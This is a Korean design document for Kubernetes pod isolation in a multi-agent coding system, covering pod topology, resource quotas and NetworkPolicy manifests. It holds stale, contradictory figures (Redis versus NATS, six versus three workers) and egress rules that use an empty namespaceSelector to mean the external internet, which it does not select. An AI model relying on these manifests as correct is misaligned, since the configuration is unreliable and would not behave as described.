---
title: "컨테이너(K8s Pod) 격리 전략 상세 설계"
version: "3.0.0"
date: "2026-02-19"
status: "완료"
related:
  - multi-agent-system.md
  - agent-roles.md
  - async-communication.md
  - spec-system.md
---

# 컨테이너(K8s Pod) 격리 전략 상세 설계

## 📋 목차

- [1. 개요 및 설계 원칙](#1-개요-및-설계-원칙)
- [2. 네임스페이스 및 Pod 토폴로지](#2-네임스페이스-및-pod-토폴로지)
- [3. Pod별 리소스 제한 (Resources)](#3-pod별-리소스-제한-resources)
- [4. NetworkPolicy (네트워크 격리)](#4-networkpolicy-네트워크-격리)

---

## 1. 개요 및 설계 원칙

### 1.1 문서 목적 및 범위

이 문서는 **Kubernetes Pod 기반 에이전트 격리 전략**의 상세 구현 지침을 제공합니다. 비동기 멀티 에이전트 시스템에서 각 에이전트가 독립된 Pod 환경에서 안전하게 실행되도록 하는 기술적 세부사항을 다룹니다.

**범위**:
- **Pod 구조 재설계**: 8개 독립 Pod → 4개 고정 Pod + Worker 0→3 (multi-container pattern)
- **통신 단순화**: Redis 24채널 Pub/Sub → NATS Core 알림 핑 + spec 파일 기반
- **리소스 예산**: 4코어/8GB 제약 (k3s 포함)
- **네트워크 격리**: NetworkPolicy 간소화 (Pod 수 감소)
- **보안 정책**: Git push 절대 금지, 로컬 커밋만 허용

**제외 사항**:
- NATS/PostgreSQL 내부 설계 → `async-communication.md` 참조
- 명세서 시스템 상세 → `spec-system.md` 참조
- 에이전트 역할 상세 → `agent-roles.md` 참조
- Watchman + NATS 핑 프로토콜 → `monitoring-scaling.md` 참조

### 1.2 다른 설계 문서와의 관계

```mermaid
graph TD
    MAS[multi-agent-system.md<br/>전체 시스템 아키텍처] --> K8S[k8s-isolation.md<br/>Pod 격리 전략]
    AR[agent-roles.md<br/>에이전트 역할] --> K8S
    AC[async-communication.md<br/>Redis/PG 통신] --> K8S
    SS[spec-system.md<br/>명세서 시스템] --> K8S
    
    K8S --> RES[리소스 제한<br/>CPU/Memory]
    K8S --> NET[네트워크 격리<br/>NetworkPolicy]
    K8S --> STOR[스토리지 권한<br/>PVC/emptyDir]
    K8S --> SEC[보안 컨텍스트<br/>SecurityContext]
    
    style K8S fill:#4CAF50,color:#fff
    style MAS fill:#2196F3,color:#fff
    style AR fill:#FF9800,color:#fff
    style AC fill:#9C27B0,color:#fff
    style SS fill:#F44336,color:#fff
```

**의존 관계**:
- `multi-agent-system.md`: 전체 시스템 아키텍처 및 Pod 구성 개요 제공
- `agent-roles.md`: 각 에이전트의 실행 환경, 네트워크 요구사항, 스토리지 권한 정의
- `async-communication.md`: Redis/PostgreSQL 접근 패턴 및 프로토콜 정의
- `spec-system.md`: 명세서 저장소 및 파일 시스템 구조 정의

### 1.3 핵심 격리 원칙

#### 1.3.1 최소 권한 원칙 (Principle of Least Privilege)

**정의**: 각 Pod는 작업 수행에 필요한 최소한의 권한만 보유합니다.

**적용 사례**:
- Worker Pod는 PVC 읽기 전용 + `/scratch` emptyDir 쓰기만 가능
- reviewer Pod는 PVC 읽기 전용 (쓰기 불가)
- 깃 매니저만 Git 쓰기 권한 보유 (OpenCode Pod)
- 각 Pod는 필요한 Redis 채널만 구독 (NetworkPolicy로 제한)

**설계 근거**: 
- Worker가 실수로 메인 프로젝트 파일을 수정하는 것을 원천 차단
- 보안 침해 시 피해 범위를 해당 Pod로 제한
- 디버깅 용이성: 어떤 Pod가 어떤 리소스를 수정했는지 명확

#### 1.3.2 깊은 방어 (Defense in Depth)

**정의**: 다층 보안 계층을 적용하여 단일 실패점(Single Point of Failure)을 제거합니다.

**보안 계층**:
1. **네트워크 계층**: NetworkPolicy로 Pod 간 통신 제한
2. **파일 시스템 계층**: PVC RO/RWX 권한 분리 + emptyDir 격리
3. **인증/인가 계층**: Redis AUTH, PostgreSQL Role-Based Access Control (RBAC)
4. **컨테이너 계층**: SecurityContext (runAsNonRoot, readOnlyRootFilesystem)
5. **오케스트레이션 계층**: K8s RBAC (ServiceAccount 권한 분리)
6. **애플리케이션 계층**: Zod 검증, 입력 sanitize, 출력 escape

**설계 근거**:
- 한 계층이 뚫려도 다른 계층에서 차단
- 예: Worker가 네트워크 정책을 우회해도, PVC RO 권한으로 쓰기 차단
- 예: PostgreSQL 침해 시, NetworkPolicy로 외부 통신 차단

#### 1.3.3 불변 인프라 (Immutable Infrastructure)

**정의**: 컨테이너 이미지는 배포 후 변경되지 않으며, 변경이 필요하면 새 이미지를 빌드하여 배포합니다.

**적용 사례**:
- 컨테이너 내부 파일 시스템은 읽기 전용 (`readOnlyRootFilesystem: true`)
- 쓰기가 필요한 경로는 emptyDir 볼륨 마운트 (`/scratch`, `/tmp`)
- 설정 변경 시 ConfigMap/Secret 업데이트 → Pod 재시작

**설계 근거**:
- 런타임 수정으로 인한 드리프트(drift) 방지
- 재현 가능한 환경 보장 (동일 이미지 = 동일 동작)
- 보안 감사 용이성 (이미지 스캔 한 번으로 전체 검증)

#### 1.3.4 네트워크 세분화 (Network Segmentation)

**정의**: Pod 간 통신은 명시적으로 허용된 경로만 가능하며, 기본은 모두 차단(deny-all)입니다.

**적용 사례**:
- 기본 정책: 모든 ingress/egress 차단
- Worker Pod는 Redis만 접근 가능 (PostgreSQL 접근 불가)
- reviewer Pod는 Redis + PostgreSQL(읽기)만 접근
- OpenCode Pod는 외부 인터넷 접근 허용 (LLM API)

**설계 근거**:
- Worker가 PostgreSQL을 직접 수정하는 것을 차단
- 외부 공격자가 Worker를 침해해도 내부 네트워크 탐색 불가
- 트래픽 경로가 명확하여 이상 탐지 용이

#### 1.3.5 시크릿 최소 노출 (Secret Minimization)

**정의**: 시크릿(환경변수, API 키)은 필요한 Pod에만 제공되며, 로그에 절대 출력되지 않습니다.

**적용 사례**:
- OpenCode Pod: LLM API 키, GitHub 토큰 (외부 통신용)
- PostgreSQL Pod: DB 관리자 비밀번호
- Worker Pod: Redis 접속 정보만 (DB 비밀번호 불필요)
- reviewer Pod: Semgrep API 키 (보안 스캔용)

**설계 근거**:
- Worker가 LLM API 키를 오용하는 것 방지
- 로그 수집 시 시크릿 유출 방지 (K8s Secret 사용, env 직접 노출 금지)
- 시크릿 로테이션 시 영향 범위 최소화

### 1.4 설계 근거: 왜 K8s Pod 격리가 필요한가

#### 1.4.1 동기식 시스템의 한계

**현재 시스템 (OpenCode 9개 에이전트)**:
- 모든 에이전트가 동일 파일 시스템 공유 → 동시 수정 시 충돌
- 순차 실행으로 병렬 처리 불가 → 개발 시간 N배 증가
- 단일 프로세스 장애 시 전체 워크플로우 중단

**문제 시나리오**:
```typescript
// ⚠️ 로직 이해용 예시 코드 — 실제 에이전트는 .agents/agents/*.md 프롬프트로 구현
// 동기식 시스템의 충돌 예시
async function problematicWorkflow() {
  // feature-developer가 컴포넌트 작성 중
  await featureDeveloper.writeComponent('Button.tsx');
  
  // test-specialist가 동시에 테스트 작성 시도 → 충돌!
  await testSpecialist.writeTest('Button.test.tsx'); // Button.tsx가 아직 완성 안됨
  
  // lint-formatter가 린트 적용 → 불완전한 코드에 린트 적용
  await lintFormatter.fixLint('Button.tsx'); // 코드가 계속 변경되어 무한 루프
}
```

#### 1.4.2 K8s Pod 격리의 장점

| 문제 | 동기식 시스템 | K8s Pod 격리 시스템 |
|------|-------------|---------------------|
| **병렬 처리** | 불가능 (순차 실행) | Worker Pod 최대 6개 병렬 실행 |
| **파일 충돌** | 동일 파일 동시 수정 시 충돌 | Worker는 `/scratch`에서 작업 후 diff 제출 |
| **테스트 오염** | 동일 환경에서 테스트 → 오염 | 각 Worker는 독립 emptyDir에서 테스트 |
| **장애 격리** | 한 에이전트 실패 시 전체 중단 | 한 Worker 실패 시 다른 Worker는 계속 작동 |
| **재현성** | 환경 드리프트 발생 | 동일 이미지 = 동일 동작 보장 |
| **보안** | 모든 에이전트가 전체 권한 | Pod별 최소 권한 분리 |

#### 1.4.3 비용 vs 효과 분석

**비용**:
- K8s 클러스터 운영 복잡도 증가 (학습 곡선)
- 컨테이너 이미지 빌드/관리 오버헤드
- 네트워크 오버헤드 (Pod 간 통신)

**효과**:
- 개발 시간: N개 작업 순차 실행 → 병렬 실행으로 1/N 단축
- 안전성: 격리된 환경에서 실험 가능 (메인 프로젝트 오염 없음)
- 확장성: Worker 수를 6개에서 더 늘릴 수 있음 (KEDA로 자동)

**결론**: 초기 설정 복잡도는 있지만, 장기적으로 개발 속도와 안전성 측면에서 압도적 이득

---

## 2. 네임스페이스 및 Pod 토폴로지

### 2.1 네임스페이스 구조

**설계 결정**: 단일 네임스페이스 `agent-system` 사용

**설계 근거**:
- 모든 에이전트 Pod가 동일한 네임스페이스에서 실행되어 서비스 디스커버리 간소화
- NetworkPolicy가 동일 네임스페이스 내에서만 작동하므로 관리 용이
- ResourceQuota를 네임스페이스 레벨로 설정하여 전체 리소스 상한 제어
- 향후 환경 분리가 필요하면 `agent-system-dev`, `agent-system-prod`로 분리 가능

**대안 및 기각 이유**:
- ❌ **Pod별 네임스페이스 분리**: 과도한 격리로 통신 복잡도 증가
- ❌ **기능별 네임스페이스 분리** (`agent-system-dev`, `agent-system-review`): Pod 간 통신 시 교차 네임스페이스 참조 필요
- ✅ **단일 네임스페이스**: 통신 간소화, NetworkPolicy로 충분한 격리 가능

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: agent-system
  labels:
    name: agent-system
    environment: production
    app.kubernetes.io/name: agent-system
    app.kubernetes.io/component: namespace
```

### 2.2 전체 Pod 배치 다이어그램

```mermaid
graph TB
    subgraph "Kubernetes Cluster (4코어/8GB)"
        subgraph "agent-system Namespace"
            subgraph "항시 실행 (고정 4개 Pod)"
                GW[gateway Pod<br/>consultant + git-manager<br/>multi-container<br/>외부 노출]
                COORD[coordinator Pod<br/>spec-manager + project-lead + reviewer<br/>multi-container]
                NATS[nats Pod<br/>NATS server<br/>64MB]
                PG[postgresql Pod<br/>PostgreSQL + pgvector<br/>512MB]
            end
            
            subgraph "오토스케일링 (KEDA 0→3)"
                W1[Worker Pod 1<br/>background-dev]
                W2[Worker Pod 2<br/>background-dev]
                W3[Worker Pod 3<br/>background-dev]
            end
            
            subgraph "스토리지"
                PVC[PVC: workspace-pvc<br/>RWX (Watchman + spec)]
            end
        end
        
        subgraph "외부 서비스"
            LLM[LLM API<br/>OpenAI/Anthropic]
            GH[GitHub API]
        end
    end
    
    GW -.->|외부 접근| LLM
    GW -.->|외부 접근| GH
    GW --> NATS
    GW --> PG
    GW --> PVC
    
    COORD --> NATS
    COORD --> PG
    COORD --> PVC
    
    W1 --> NATS
    W2 --> NATS
    W3 --> NATS
    W1 --> PVC
    W2 --> PVC
    W3 --> PVC
    
    style GW fill:#4CAF50,color:#fff
    style COORD fill:#2196F3,color:#fff
    style NATS fill:#27AAE1,color:#fff
    style PG fill:#336791,color:#fff
    style W1 fill:#795548,color:#fff
    style W2 fill:#795548,color:#fff
    style W3 fill:#795548,color:#fff
    style PVC fill:#FFC107,color:#000
```

### 2.3 Pod별 역할 요약 테이블

| Pod 이름 | 역할 | 레플리카 | 스토리지 | 네트워크 접근 | 외부 노출 |
|---------|------|---------|---------|-------------|----------|
| **gateway Pod** | consultant + git-manager (multi-container) | 1 (고정) | PVC RWX | NATS, PostgreSQL, 외부 인터넷 | ✅ (사용자 터미널) |
| **coordinator Pod** | spec-manager + project-lead + reviewer (multi-container) | 1 (고정) | PVC RWX | NATS, PostgreSQL | ❌ |
| **nats Pod** | NATS server (알림 핑) | 1 (고정) | emptyDir (영속 불필요) | 내부만 | ❌ |
| **postgresql Pod** | PostgreSQL + pgvector | 1 (고정) | PVC RWX (DB 데이터) | 내부만 | ❌ |
| **Worker Pod ×N** | background-dev | 0~3 (KEDA) | PVC RO + emptyDir `/scratch` | NATS만 | ❌ |

**v3.0.0 주요 변경사항**:
- **8개 → 4+N 통합**: 독립 Pod 8개 → multi-container pod 2개 + 인프라 2개 + Worker 0→3
- **Redis → NATS**: 100~300MB Redis 제거, ~50MB NATS Core로 교체
- **Worker 축소**: 최대 6개 → 3개 (리소스 예산 반영)
- **spec 파일 기반 통신**: NATS는 "알림 핑"만, 상세 정보는 PVC spec 파일에

### 2.4 설계 근거: 토폴로지 선택

#### 2.4.1 왜 OpenCode Pod를 외부 노출하는가?

- **사용자 터미널 접근**: 컨설턴트가 실시간으로 사용자와 대화
- **깃 매니저 통합**: 동일 Pod 내에서 Git 작업 수행 (권한 단순화)
- **컨텍스트 공유**: 컨설턴트가 수집한 요구사항을 깃 매니저가 바로 활용

#### 2.4.2 왜 Worker Pod만 오토스케일링하는가?

- **부하 변동**: 작업 큐 길이에 따라 필요한 Worker 수가 변동
- **비용 최적화**: 작업이 없을 때 0으로 축소 (유휴 비용 제거)
- **고정 Pod 안정성**: 항시 실행 Pod는 상태를 유지해야 하므로 스케일링 불필요

#### 2.4.3 왜 Redis/PostgreSQL은 외부 노출하지 않는가?

- **보안**: 외부 공격 표면 최소화
- **접근 제어**: NetworkPolicy로 내부 Pod만 접근 가능
- **성능**: 내부 네트워크 통신이 외부보다 빠름

---

## 3. Pod별 리소스 제한 (Resources)

### 3.1 리소스 제한 원칙

**설계 원칙**:
1. **requests < limits**: 최소 보장 리소스(requests) < 최대 사용 가능 리소스(limits)
2. **QoS 클래스 분리**: 
   - **Guaranteed**: 중요 Pod (OpenCode, Redis, PostgreSQL) — requests = limits
   - **Burstable**: 일반 Pod (doc-manager, project-lead, reviewer, junior, Worker) — requests < limits
3. **OOM Killer 방지**: Memory limits를 충분히 설정하여 Pod가 강제 종료되지 않도록 함
4. **CPU 스로틀링 허용**: CPU limits는 여유 있게 설정 (스로틀링은 성능 저하이지 Pod 종료 아님)

### 3.2 Pod별 리소스 테이블

| Pod 이름 | CPU Requests | CPU Limits | Memory Requests | Memory Limits | QoS 클래스 | 설계 근거 |
|---------|-------------|-----------|----------------|--------------|-----------|-----------|
| **gateway Pod** | 500m | 1000m | 512Mi | 1Gi | Burstable | consultant + git-manager 2개 컨테이너. LLM API 대기 시간 많음 |
| **coordinator Pod** | 500m | 1000m | 1Gi | 2Gi | Burstable | spec-manager + project-lead + reviewer 3개 컨테이너. 작업 분할 + 리뷰 동시 수행 |
| **nats Pod** | 50m | 100m | 32Mi | 64Mi | Burstable | 경량 알림 핑만 전달. JetStream 불사용 |
| **postgresql Pod** | 500m | 1000m | 256Mi | 512Mi | Burstable | spec 파일이 persistent state이므로 DB는 메타데이터만 |
| **Worker Pod ×N** | 500m | 1000m | 512Mi | 1Gi | Burstable | 코드 작성 + 테스트 + 빌드. `/scratch` 임시 파일 |

### 3.3 리소스 합산 및 클러스터 요구사항

#### 3.3.1 항시 실행 Pod 리소스 합계

| 항목 | CPU Requests | CPU Limits | Memory Requests | Memory Limits |
|------|-------------|-----------|----------------|--------------|
| gateway Pod | 500m | 1000m | 512Mi | 1Gi |
| coordinator Pod | 500m | 1000m | 1Gi | 2Gi |
| nats Pod | 50m | 100m | 32Mi | 64Mi |
| postgresql Pod | 500m | 1000m | 256Mi | 512Mi |
| **항시 실행 합계** | **1550m (1.55코어)** | **3100m (3.1코어)** | **1800Mi (1.8Gi)** | **3648Mi (3.6Gi)** |

#### 3.3.2 Worker Pod 최대 스케일링 시 리소스

| 항목 | CPU Requests | CPU Limits | Memory Requests | Memory Limits |
|------|-------------|-----------|----------------|--------------|
| Worker Pod 1개 | 500m | 1000m | 512Mi | 1Gi |
| Worker Pod 3개 (최대) | **1500m (1.5코어)** | **3000m (3코어)** | **1536Mi (1.5Gi)** | **3072Mi (3Gi)** |

#### 3.3.3 전체 클러스터 최대 리소스

| 항목 | CPU Requests | CPU Limits | Memory Requests | Memory Limits |
|------|-------------|-----------|----------------|--------------|
| k3s 컨트롤 플레인 | 500m | — | 750Mi | — |
| 항시 실행 합계 | 1550m | 3100m | 1800Mi | 3648Mi |
| Worker ×3 합계 | 1500m | 3000m | 1536Mi | 3072Mi |
| **전체 합계** | **3550m (3.55코어)** | **6100m (6.1코어)** | **4086Mi (4Gi)** | **6720Mi (6.6Gi)** |
| **여유** | **450m (0.45코어)** | — | **4010Mi (3.9Gi)** | — |

**클러스터 노드 권장 스펙**:
- **최소**: 4 vCPU, 8GB RAM (requests 기준 + k3s 오버헤드)
- **권장**: 4 vCPU, 8GB RAM (limits 기준은 버스트이므로 평상시 4/8 충분)
- **노드 수**: 1개 (경량 k3s 단일 노드, 고가용성 불필요한 개발 환경)

### 3.4 ResourceQuota 매니페스트

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/resource-quota.yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: agent-system-quota
  namespace: agent-system
spec:
  hard:
    # CPU 제한
    requests.cpu: "6000m"      # 전체 requests 합계 상한 (여유분 포함)
    limits.cpu: "12000m"       # 전체 limits 합계 상한
    
    # 메모리 제한
    requests.memory: "8Gi"     # 전체 requests 합계 상한
    limits.memory: "16Gi"      # 전체 limits 합계 상한
    
    # Pod 수 제한
    pods: "20"                 # 최대 Pod 수 (항시 7개 + Worker 6개 + 여유분)
    
    # PVC 제한
    persistentvolumeclaims: "5"  # workspace-pvc, pg-data-pvc 등
    
    # 서비스 제한
    services: "10"             # Redis, PostgreSQL, OpenCode 서비스 등
    
    # ConfigMap/Secret 제한
    configmaps: "20"
    secrets: "20"
```

**설계 근거**:
- **requests.cpu: 6000m**: 항시 실행(2500m) + Worker ×6(3000m) + 여유분(500m)
- **limits.cpu: 12000m**: 모든 Pod가 동시에 limits까지 사용하는 경우 대비
- **requests.memory: 8Gi**: 항시 실행(2.5Gi) + Worker ×6(3Gi) + 여유분(2.5Gi)
- **pods: 20**: 항시 실행 7개 + Worker 6개 + DaemonSet(로깅 등) + 여유분

### 3.5 LimitRange 매니페스트

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/limit-range.yaml
apiVersion: v1
kind: LimitRange
metadata:
  name: agent-system-limit-range
  namespace: agent-system
spec:
  limits:
    # 컨테이너 기본값
    - type: Container
      default:
        cpu: "500m"         # 명시하지 않은 경우 기본 limits
        memory: "512Mi"
      defaultRequest:
        cpu: "250m"         # 명시하지 않은 경우 기본 requests
        memory: "256Mi"
      max:
        cpu: "2000m"        # 단일 컨테이너 최대 limits
        memory: "2Gi"
      min:
        cpu: "100m"         # 단일 컨테이너 최소 requests
        memory: "128Mi"
    
    # Pod 기본값
    - type: Pod
      max:
        cpu: "3000m"        # 단일 Pod 최대 CPU
        memory: "4Gi"       # 단일 Pod 최대 메모리
```

**설계 근거**:
- **기본값 설정**: 개발자가 리소스를 명시하지 않아도 안전한 기본값 적용
- **최대값 제한**: 실수로 과도한 리소스를 요청하는 것 방지
- **최소값 제한**: 너무 작은 리소스로 Pod가 OOM Killer에 걸리는 것 방지

### 3.6 설계 근거: 리소스 값 선택 이유

#### 3.6.1 OpenCode Pod: CPU 500m/1000m

- **CPU Requests 500m**: 컨설턴트는 대부분 LLM API 응답 대기 (I/O bound). 깃 매니저는 diff 적용 시만 CPU 사용
- **CPU Limits 1000m**: 큰 diff를 git apply할 때 CPU 버스트 필요
- **메모리 512Mi/1Gi**: 프로젝트 파일 시스템 전체 접근하지만, 실제로는 필요한 파일만 읽음

#### 3.6.2 Worker Pod: CPU 500m/1000m

- **CPU Requests 500m**: 코드 작성은 CPU 사용 낮음 (LLM API 호출 대기)
- **CPU Limits 1000m**: 테스트 실행 + 린트 + 빌드 시 CPU 버스트 (Vite 빌드, Vitest 실행)
- **메모리 512Mi/1Gi**: `/scratch`에 프로젝트 복사 + node_modules + 테스트 결과 → 메모리 여유 필요

#### 3.6.3 PostgreSQL Pod: CPU 500m/1000m

- **CPU Requests 500m**: pgvector HNSW 인덱스 검색 시 CPU 사용 (신입 개발자의 유사 실패 검색)
- **CPU Limits 1000m**: 대량 임베딩 삽입 시 인덱스 재구성 CPU 버스트
- **메모리 512Mi/1Gi**: 데이터베이스 크기는 작지만 (명세서 + 시행착오), 인덱스 캐시 필요

#### 3.6.4 reviewer Pod: CPU 500m/1000m

- **CPU Requests 500m**: Semgrep 정적 분석 + AST 파싱은 CPU 집약적
- **CPU Limits 1000m**: 여러 파일 동시 스캔 시 병렬 처리로 CPU 버스트
- **메모리 512Mi/1Gi**: 큰 파일(예: 번들된 JS) 파싱 시 메모리 증가

---

## 4. NetworkPolicy (네트워크 격리)

### 4.1 네트워크 격리 전략 개요

**핵심 원칙**:
1. **기본 차단 (Deny-All)**: 모든 ingress/egress를 기본적으로 차단
2. **명시적 허용 (Allowlist)**: 필요한 통신만 명시적으로 허용
3. **최소 권한**: 각 Pod는 작업에 필요한 최소한의 네트워크 접근만 보유
4. **계층적 접근 제어**: 데이터베이스는 읽기/쓰기 권한을 Pod별로 분리

### 4.2 네트워크 격리 다이어그램

```mermaid
graph LR
    subgraph "External"
        USER[사용자<br/>터미널]
        LLM[LLM API]
        GH[GitHub API]
    end
    
    subgraph "agent-system Namespace"
        GW[gateway Pod<br/>consultant+git-manager]
        COORD[coordinator Pod<br/>spec+lead+reviewer]
        NATS[nats Pod<br/>4222]
        PG[PostgreSQL Pod<br/>5432]
        W[Worker Pod ×3]
    end
    
    USER -->|터미널 접속| GW
    GW -->|LLM API 호출| LLM
    GW -->|푸시 금지, PR만| GH
    
    GW -->|NATS 핑 수신/발신| NATS
    COORD -->|NATS 핑 수신/발신| NATS
    W -->|NATS 핑 수신만| NATS
    
    GW -->|R/W| PG
    COORD -->|R/W| PG
    
    W -.->|차단| PG
    W -.->|차단| LLM
    
    style GW fill:#4CAF50,color:#fff
    style COORD fill:#2196F3,color:#fff
    style NATS fill:#27AAE1,color:#fff
    style PG fill:#336791,color:#fff
    style W fill:#795548,color:#fff
```

**설계 근거**:
- **Worker → PostgreSQL 차단**: Worker는 spec 파일 읽기로 작업 수신, DB 접근 불필요
- **Worker → LLM API 차단**: Worker는 사전 정의된 작업만 수행 (동적 LLM 호출 불필요)
- **NATS 단방향**: Worker는 NATS 구독만 (발행 불필요), 결과는 spec 파일 업데이트로 전달
- **Git push 금지**: gateway Pod도 push 불가, 로컬 커밋만 허용

### 4.3 기본 정책: deny-all

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/00-deny-all.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all-ingress-egress
  namespace: agent-system
spec:
  podSelector: {}  # 모든 Pod에 적용
  policyTypes:
    - Ingress
    - Egress
  # ingress/egress 섹션이 없으므로 모두 차단
```

**설계 근거**:
- 모든 Pod는 기본적으로 외부 통신 불가
- 이후 각 Pod별 NetworkPolicy에서 필요한 통신만 명시적으로 허용
- 공격자가 Pod를 침해해도 내부 네트워크 탐색 불가

### 4.4 NATS Pod NetworkPolicy

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/nats.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: nats-policy
  namespace: agent-system
spec:
  podSelector:
    matchLabels:
      app: nats
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # 모든 에이전트 Pod에서 4222 접근 허용
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/part-of: agent-system
      ports:
        - protocol: TCP
          port: 4222  # NATS client 포트
        - protocol: TCP
          port: 8222  # NATS monitoring 포트
  egress:
    # NATS는 외부 통신 불필요 (DNS만 허용)
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **Ingress**: 모든 에이전트 Pod가 NATS에 접근 필요 (알림 핑 송수신)
- **Egress**: NATS는 독립 실행형 메시지 브로커이므로 외부 통신 불필요 (DNS만 허용)
- **JetStream 미사용**: spec 파일이 persistent state이므로 NATS는 일시적 알림만

### 4.5 PostgreSQL Pod NetworkPolicy

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/postgresql.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: postgresql-policy
  namespace: agent-system
spec:
  podSelector:
    matchLabels:
      app: postgresql
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # gateway, coordinator Pod만 5432 접근 허용 (Worker는 제외)
    - from:
        - podSelector:
            matchLabels:
              app: gateway
      ports:
        - protocol: TCP
          port: 5432
    - from:
        - podSelector:
            matchLabels:
              app: coordinator
      ports:
        - protocol: TCP
          port: 5432
  egress:
    # PostgreSQL도 외부 통신 불필요 (DNS만 허용)
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **Worker Pod 제외**: Worker는 spec 파일 읽기로 작업 수신, DB 접근 불필요
- **Pod 수 간소화**: multi-container pod 통합으로 NetworkPolicy 규칙 단순화
- **보안**: 데이터베이스는 가장 민감한 리소스이므로 접근 Pod를 최소화 (2개만)

### 4.6 gateway Pod NetworkPolicy

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/gateway.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gateway-policy
  namespace: agent-system
spec:
  podSelector:
    matchLabels:
      app: gateway
  policyTypes:
    - Ingress
    - Egress
  ingress:
    # 사용자 터미널 접속 허용 (LoadBalancer/NodePort Service 경유)
    - from: []  # 모든 외부 소스 허용 (Service가 제어)
      ports:
        - protocol: TCP
          port: 8080  # OpenCode 서버 포트
  egress:
    # 1. NATS 접근
    - to:
        - podSelector:
            matchLabels:
              app: nats
      ports:
        - protocol: TCP
          port: 4222
    
    # 2. PostgreSQL 접근
    - to:
        - podSelector:
            matchLabels:
              app: postgresql
      ports:
        - protocol: TCP
          port: 5432
    
    # 3. 외부 인터넷 접근 (LLM API, GitHub API)
    # ⚠️ GitHub push 금지는 애플리케이션 레벨에서 제어
    - to:
        - namespaceSelector: {}  # 모든 외부
      ports:
        - protocol: TCP
          port: 443  # HTTPS
        - protocol: TCP
          port: 80   # HTTP (리다이렉트용)
    
    # 4. DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **Ingress 무제한**: 사용자 터미널 접속은 Service 레벨에서 제어 (LoadBalancer IP 제한 등)
- **Egress 외부 허용**: consultant는 LLM API 호출, git-manager는 GitHub API 호출 (PR 생성만)
- **Git push 금지**: NetworkPolicy로는 차단 불가 (HTTPS 443 허용 필요), 애플리케이션 레벨에서 push 명령어 차단

### 4.7 Worker Pod NetworkPolicy

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/worker.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: worker-policy
  namespace: agent-system
spec:
  podSelector:
    matchLabels:
      app: agent-worker
  policyTypes:
    - Ingress
    - Egress
  ingress: []  # Worker는 외부 요청 받지 않음 (NATS 구독으로 작업 수신)
  
  egress:
    # 1. NATS 접근 (알림 핑 수신만, 발행 불필요)
    - to:
        - podSelector:
            matchLabels:
              app: nats
      ports:
        - protocol: TCP
          port: 4222
    
    # 2. DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **PostgreSQL 차단**: Worker는 spec 파일 읽기로 작업 수신 (DB 접근 불필요)
- **외부 인터넷 차단**: Worker는 MCP 도구 사용 불필요 (LLM API 차단)
- **NATS 구독만**: Worker는 NATS에서 알림 핑 수신만, 발행 불필요 (결과는 spec 파일 업데이트)

**v2와 차이점**:
- Redis 작업 큐 폴링 → NATS 알림 핑 + PVC spec 파일 읽기
- 외부 인터넷 접근 제거 (npm registry, LLM API 모두 차단)

### 4.8 coordinator Pod NetworkPolicy

```yaml
# ⚠️ 로직 이해용 예시 — 실제 매니페스트는 구현 Phase에서 확정
# k8s/network-policy/coordinator.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: coordinator-policy
  namespace: agent-system
spec:
  podSelector:
    matchLabels:
      app: coordinator  # spec-manager + project-lead + reviewer 통합
  policyTypes:
    - Ingress
    - Egress
  ingress: []  # 외부 요청 받지 않음 (NATS 알림 핑 + Watchman spec 감지)
  
  egress:
    # 1. NATS 접근 (알림 핑 송수신)
    - to:
        - podSelector:
            matchLabels:
              app: nats
      ports:
        - protocol: TCP
          port: 4222
    
    # 2. PostgreSQL 접근 (읽기/쓰기)
    - to:
        - podSelector:
            matchLabels:
              app: postgresql
      ports:
        - protocol: TCP
          port: 5432
    
    # 3. 외부 API (Semgrep, Context7, Exa, Serena MCP)
    - to:
        - namespaceSelector: {}
      ports:
        - protocol: TCP
          port: 443
    
    # 4. DNS
    - to:
        - namespaceSelector:
            matchLabels:
              name: kube-system
        - podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
```

**설계 근거**:
- **Multi-container Pod**: spec-manager, project-lead, reviewer가 하나의 Pod에 통합
- **PostgreSQL 읽기/쓰기**: spec-manager는 spec 메타데이터 저장, reviewer는 과거 리뷰 결과 참조
- **Semgrep API**: reviewer 컨테이너가 보안 스캔 수행
- **MCP 접근**: project-lead가 Context7/Exa/Serena 사용

### 4.9 NetworkPolicy 요약 테이블

